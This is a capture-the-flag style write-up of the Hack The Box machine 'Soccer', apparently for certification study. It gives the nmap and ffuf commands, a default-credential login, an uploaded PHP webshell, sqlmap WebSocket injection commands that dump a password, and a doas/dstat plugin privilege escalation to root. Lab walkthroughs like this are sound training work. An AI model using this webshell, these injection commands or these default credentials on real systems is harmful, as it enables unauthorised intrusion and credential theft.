---
title: "HTB Soccer"
date: 2026-05-15 11:18 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Linux, Easy, WS]
image: /assets/img/posts/soccer/soccer.png
---
**HTB Soccer** is a Linux machine that starts with `ffuf` directory fuzzing to discover a `Tiny File Manager` instance with default credentials, uploads a `PHP webshell` to a world-writable directory for initial access as `www-data`, discovers a hidden `vhost` via `Nginx` configuration, exploits a `WebSocket`-based `SQL injection` with `sqlmap` to dump credentials from `soccer_db`, and escalates to `root` by writing a malicious `dstat` plugin to a player-writable plugin directory and executing it via `doas`.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.38.111 -nv --min-rate 1000
```
```
PORT     STATE SERVICE                                                                                                                                       
22/tcp   open  ssh                                                                                                                                           
80/tcp   open  http                                                                                                                                          
9091/tcp open  xmltec-xmlmail
```
- NSE Scripts & Version
```
nmap -sCV -p22,80,9091 10.129.38.111 -nv --min-rate 1000
```
```
PORT     STATE SERVICE         VERSION                                                                                                                       
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                  
| ssh-hostkey:                                                                                                                                               
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)                                                                                               
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)                                                                                              
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)                                                                                            
80/tcp   open  http            nginx 1.18.0 (Ubuntu)                                                                                                         
|_http-title: Did not follow redirect to http://soccer.htb/                                                                                                  
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                  
9091/tcp open  xmltec-xmlmail?                                                                                                                               
| fingerprint-strings:                                                                                                                                       
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:                                                                
|     HTTP/1.1 400 Bad Request                                                                                                                               
|     Connection: close                                                                                                                                      
|   GetRequest:                                                                                                                                              
|     HTTP/1.1 404 Not Found                                                                                                                                 
|     Content-Security-Policy: default-src 'none'                                                                                                            
|     X-Content-Type-Options: nosniff                                                                                                                        
|     Content-Type: text/html; charset=utf-8                                                                                                                 
|     Content-Length: 139                                                                                                                                    
|     Date: Fri, 15 May 2026 10:26:01 GMT                                                                                                                    
|     Connection: close                                                                                                                                      
|     <!DOCTYPE html>                                                                                                                                        
|     <html lang="en">                                                                                                                                       
|     <head>                                                                                                                                                 
|     <meta charset="utf-8">                                                                                                                                 
|     <title>Error</title>                                                                                                                                   
|     </head>                                                                                                                                                
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
```
### Fuzzing
```
ffuf -u 'http://soccer.htb/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
```
```
tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 134ms]
```
### Tiny Manager (default creds)
![tiny](/assets/img/posts/soccer/tiny.png)
```
Default-Creds ➜ admin:admin@123
```
### File Upload
![tiny2](/assets/img/posts/soccer/tiny2.png)
- Perms = `0757` ➜ Others have **write and execute** permissions on that folder, so we can upload `shell.php` and test it.
```php
<?php
system($_REQUEST['cmd']);
?>
```
```
➜  Soccer curl 'http://soccer.htb/tiny/uploads/shell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
➜  Soccer curl -x http://127.0.0.1:8080 'http://soccer.htb/tiny/uploads/shell.php?cmd=id'
```
![www-data](/assets/img/posts/soccer/www-data.png)
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo;fg
```
### Nginx Configuration
![www-data-2](/assets/img/posts/soccer/www-data-2.png)
- Another vhost is configured in Nginx, and the hostname is `soc-player.soccer.htb`.
## soc-player.soccer.htb
### SQLi (Ticket Check)
The important endpoint that appears to be injectable is `http://soc-player.soccer.htb/check`, with boolean-based injection as shown in the image below.
![ticket](/assets/img/posts/soccer/ticket.png)
The request is sent over a WebSocket, and the `id` field shown in Burp’s WebSockets history looks like the injectable parameter.

![ws](/assets/img/posts/soccer/ws1.png)
```
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' --technique=B --threads=10 --level=5 --risk=3 --batch
```
###  DB Enumeration

```
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' --technique=B --threads=10 --level=5 --risk=3 --batch --dbs
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' --technique=B --threads=10 --level=5 --risk=3 --batch -D soccer_db --tables
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' --technique=B --threads=10 --level=5 --risk=3 --batch -D soccer_db -T accounts --dump
```

| id   | email             | password               | username |
|------|-------------------|------------------------|----------|
| 1324 | player@player.htb | PlayerOftheMatch2022   | player   |

## Shell as Player
```
ssh player@10.129.38.111
```
### Priv Esc
```
player@soccer:~$ id                                                                                                                             10:26 [16/16]
uid=1001(player) gid=1001(player) groups=1001(player)                                                                                                        
player@soccer:~$ find / -user player 2>/dev/null | grep -v '^/proc\|^/run\|/sys'                                                                             
/dev/pts/1                                                                                                                                                   
/home/player                                                                                                                                                 
/home/player/.cache                                                                                                                                          
/home/player/.cache/motd.legal-displayed                                                                                                                     
/home/player/.bash_logout                                                                                                                                    
/home/player/.bashrc                                                                                                                                         
/home/player/.profile                                                                                                                                        
player@soccer:~$ find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|/sys'                                                                            
/usr/local/share/dstat                                                                                                                                       
/home/player                                                                                                                                                 
/home/player/.cache                                                                                                                                          
/home/player/.cache/motd.legal-displayed                                                                                                                     
/home/player/.bash_logout                                                                                                                                    
/home/player/.bashrc                                                                                                                                         
/home/player/.profile
/home/player/user.txt
```
- suid
```
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
```
```
player@soccer:~$ find / -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
player@soccer:~$ 
```
```
player@soccer:~$ ls -al /usr/local/share/dstat
total 8
drwxrwx--- 2 root player 4096 Dec 12  2022 .
drwxr-xr-x 6 root root   4096 Nov 17  2022 ..
```
As we can see here, there are two unusual findings: the path of `doas`, which is a binary similar to `sudo`, and `dstat`, for which we have write access to its path. The privilege escalation will be performed by adding a custom plugin to `dstat` and then running it with `doas`.
```
player@soccer:~$ doas /usr/bin/dstat --hoxon
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)
root@soccer:/home/player# 
```